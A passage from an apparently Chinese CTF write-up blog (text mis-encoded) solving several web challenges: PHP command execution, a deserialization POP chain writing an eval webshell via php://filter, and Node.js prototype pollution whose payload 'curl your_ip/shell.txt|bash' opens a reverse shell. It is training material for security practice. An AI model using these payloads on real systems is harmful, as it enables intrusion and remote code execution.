&#125;</span><br><span class="line">        imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å»<code>example/1.php</code>ä¸‹å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?0=system</span><br><span class="line">post:</span><br><span class="line">1=grep -r flag /etc</span><br></pre></td></tr></table></figure>

<h2 id="ç¾ŠåŸæ¯-2020-EasySer"><a href="#ç¾ŠåŸæ¯-2020-EasySer" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]EasySer"></a>[ç¾ŠåŸæ¯ 2020]EasySer</h2><ul>
<li>ssrf</li>
<li>pop</li>
</ul>
<p><code>robots.txt</code></p>
<p><code>star1.php</code></p>
<p>ssrf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://c98e5f92-46db-4b2a-8c70-16dadf67dd4a.node4.buuoj.cn:81/star1.php?path=http://127.0.0.1/ser.php</span><br></pre></td></tr></table></figure>

<p><code>ser.php</code>ï¼Œé“¾å­ä¸€çœ¼å°±å¯ä»¥çœ‹å‡ºæ¥ï¼Œä½†æ˜¯æ²¡æœ‰å…¥å£å•Šå¯æ¶ï¼Œç”¨arjunçˆ†åªæœ‰path</p>
<p><img src="https://img-blog.csdnimg.cn/db0bc17b9c7c4a5485d380954123e400.png" alt="image-20220622111524886"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>= <span class="variable">$d</span>. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>çœ‹ç½‘ä¸Šçš„wpè¯´è¿˜å­˜åœ¨å‚æ•°<code>c</code>ï¼Œé‚£å°±ç›´æ¥æ„é€ å§ï¼Œåˆ©ç”¨<code>base64</code>ç»•è¿‡<code>exit()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yongen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = <span class="string">&quot;php://filter/write=convert.base64-decode/resource=ameuu.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;</span>; <span class="comment">// eval($_POST[&#x27;cmd&#x27;]);</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// public function hasaki()&#123;</span></span><br><span class="line">    <span class="comment">//     $d   = &#x27;<span class="meta">&lt;?php</span> die(&quot;nononon&quot;);&#x27;;</span></span><br><span class="line">    <span class="comment">//     $a= $d. $this-&gt;text;</span></span><br><span class="line">    <span class="comment">//      @file_put_contents($this-&gt; file,$a);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">var_dump(urlencode(serialize(<span class="keyword">new</span> GWHT())));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/54069f39c9d14fcdb8c5ac61b94df38f.png" alt="image-20220622112512327"></p>
<p>è®¿é—®<code>ameuu.php</code></p>
<p><img src="https://img-blog.csdnimg.cn/79b9d61b9029448e8a2182903832d281.png" alt="image-20220622112537788"></p>
<h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-notes"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-notes" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes</h2><ul>
<li>nodejs åŸå‹é“¾æ±¡æŸ“</li>
<li>undefsafe</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.owner = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">write_note</span>(<span class="params">author, raw_note</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.note_list[(<span class="built_in">this</span>.num++).toString()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="built_in">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">edit_note</span>(<span class="params">id, author, raw</span>)</span> &#123;</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_all_notes</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">remove_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="built_in">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç®€å•å®¡è®¡ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>add_note</code>è·¯ç”±ä¸‹postå¢åŠ noteï¼Œç„¶åå¯ä»¥ä¿®æ”¹ã€åˆ é™¤ç­‰ï¼Œç„¶åå¯ä»¥åœ¨<code>status</code>è·¯ç”±ä¸‹æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³åšçš„ä¸å°±æ˜¯æƒ³æŠŠ<code>commands</code>æ•°ç»„é‡Œé¢çš„å†…å®¹æ”¹æˆæˆ‘ä»¬æƒ³æ‰§è¡Œçš„å‘½ä»¤ç„¶åé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œå˜›</p>
<p>é‚£ä¹ˆæˆ‘ä»¬æœ€ç»ˆæƒ³è¦æ±¡æŸ“çš„ç‚¹å°±æ˜¯åœ¨<code>status</code>äº†</p>
<p><a href="https://xz.aliyun.com/t/10032#toc-12">https://xz.aliyun.com/t/10032#toc-12</a></p>
<p>è¯´æ˜åœ¨<code>edit_note</code>æ–¹æ³•ä¸­çš„<code>undefsafe(this.note_list, id + &#39;.author&#39;, author);</code>å¯ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬å°†objectè¿›è¡Œæ±¡æŸ“ï¼ŒåŠ ä¸Šæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè€Œ<code>commond</code>ä½œä¸ºobjectçš„å­ç±»å°±ä¼šè¢«æ±¡æŸ“</p>
<p>ç›´æ¥ä¸Špayloadï¼šï¼ˆè¿™é‡Œå› ä¸ºexecæ˜¯ä¸ä¼šæŠŠç»“æœè¿”å›å‡ºæ¥çš„ï¼Œæ‰€ä»¥ç›´æ¥åå¼¹shellå§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/edit_note</span><br><span class="line">post:</span><br><span class="line">id=__proto__&amp;author=curl your_ip/shell.txt|bash&amp;raw=123</span><br><span class="line"></span><br><span class="line">/status</span><br></pre></td></tr></table></figure>

<p>vpsç›‘å¬2333ç«¯å£ï¼ŒæˆåŠŸåå¼¹shellï¼Œæ²¡æœ‰ä»»ä½•é˜»ç¢ç›´æ¥æ‹¿åˆ°flag</p>
<h2 id="NPUCTF2020-webğŸ•"><a href="#NPUCTF2020-webğŸ•" class="headerlink" title="[NPUCTF2020]webğŸ•"></a>[NPUCTF2020]webğŸ•</h2><ul>
<li>æ°´ è¯ˆéª—</li>
<li>javaå­—èŠ‚ç </li>
</ul>
<p>ä¸€å¼€å§‹æ˜¯phpï¼Œä¸€çœ‹å°±èƒ½çŸ¥é“ï¼Œå¦‚æœå¯ä»¥åªè¦å…ˆåæ‰§è¡Œä¸€ä¸‹<code>encrypt</code>å’Œ<code>decrypt</code>å°±èƒ½å¾—åˆ°flagäº†ï¼Œä½†æ˜¯ç»“æœæ˜¯1ï¼Œæ˜¾è€Œæ˜“è§æ˜¯å‡çš„flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);  <span class="comment">//å®šä¹‰åŠ å¯†æ–¹å¼</span></span><br><span class="line">define(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="variable">$key</span>);    <span class="comment">//å®šä¹‰å¯†é’¥</span></span><br><span class="line">define(<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;6666666666666666&quot;</span>);    <span class="comment">//å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6</span></span><br><span class="line">define(<span class="string">&quot;BR&quot;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))header(<span class="string">&#x27;location:./index.php?source=1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;--------encrypt---------&quot;</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;IV:&#x27;</span>.<span class="variable">$iv</span>.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt(<span class="variable">$data</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode(<span class="variable">$data</span>),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,<span class="variable">$iv</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;False&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = IV;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$flag</span>;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&quot;decrypt&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;iv&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯&quot;</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥çœ‹Javaï¼Œæœ¬æ¥è¯´æ˜¯è¦é€†ä¸€ä¸‹ï¼Œä½†æ˜¯ç›´æ¥ç”¨IDEAæ‰“å¼€å°±å¥½äº†</p>
<p>å¾—åˆ°å­—èŠ‚ç æ•°ç»„ï¼Œç›´æ¥è½¬ä¸€ä¸‹å°±å¥½å•¦ï¼ˆ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reByte</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] var10000 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; var10000.length;i++) &#123;</span><br><span class="line">            System.out.print((<span class="keyword">char</span>) var10000[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><ul>
<li>åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSè‡ªåŠ¨æ‰§è¡Œsession_start</li>
</ul>
<p><code>source.zip</code>ç›´æ¥ä¸‹è½½</p>
<p>ç™»å½•æ³¨å†Œçš„å…¥å£éƒ½æ˜¯ä»<code>index.php</code>è¿›å…¥çš„ï¼Œå¯ä»¥å‘ç°<code>filter</code>ä¸­å­˜åœ¨<code>addslashes</code>è¿›è¡Œè½¬ä¹‰ï¼Œè€Œå‰é¢çš„å‡ ä¸ªéå†ä½¿å¾—æˆ‘ä»¬è¾“å…¥çš„æ•°æ®éƒ½ä¼šæŠŠç‰¹æ®Šå­—ç¬¦ç»™è½¬ä¹‰äº†ï¼Œå¹¶ä¸”æ³¨å†Œç™»å½•ä¹‹åä¹Ÿæ²¡æœ‰é‡æ–°æŸ¥çœ‹ä¸ªäººä¿¡æ¯çš„åŠŸèƒ½æ‰€ä»¥ä¹Ÿä¸èƒ½è¿›è¡ŒäºŒæ¬¡æ³¨å…¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SESSION</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_GET</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_POST</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span 